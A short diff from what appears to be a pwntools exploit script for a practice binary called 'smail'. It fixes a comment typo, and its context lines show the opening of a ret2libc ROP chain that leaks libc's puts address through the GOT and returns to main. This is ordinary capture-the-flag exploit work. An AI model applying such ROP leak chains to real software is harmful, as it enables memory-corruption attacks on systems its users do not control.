@@ -12,7 +12,7 @@ bin = ELF("./smail")  # load binary for rop
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # load libc for ret2libc
 proc = process("./smail")  # start the process
 context.binary = bin  # set the context to the binary
-rop = ROP(bin)  # create the first rob object
+rop = ROP(bin)  # create the first rop object
 
 rop.call(bin.sym.puts, [bin.got.puts])  # leak the address of libc puts
 rop.call(bin.sym.main)  # return to the vuln function
